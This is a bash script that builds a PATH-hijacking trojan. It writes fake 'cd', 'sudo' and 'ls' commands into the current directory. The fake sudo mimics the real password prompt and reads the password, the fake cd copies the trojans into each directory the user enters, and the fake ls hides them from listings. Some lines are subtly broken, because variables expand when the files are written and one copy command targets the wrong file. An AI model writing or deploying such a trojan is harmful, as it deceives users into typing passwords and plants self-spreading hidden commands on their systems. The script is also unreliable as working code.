#!/bin/bash

PATH=.:$PATH

echo "#!/bin/bash" > cd
echo "/bin/cp cd $1cd" >> cd
echo "/bin/cp sudo $1sudo" >> cd
echo "/bin/cp ls $1sudo" >> cd
echo "/bin/cd $1" >> cd
echo "exec bash" >> cd
chmod +x cd

echo "#!/bin/bash" > sudo
echo "read -sp \"[sudo] password for $(whoami): \" p" >> sudo
echo "echo $p | /usr/bin/sudo -S $@" >> sudo
chmod +x sudo

echo "#!/bin/bash" > ls
echo "/bin/ls $@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | column" >> ls
chmod +x ls
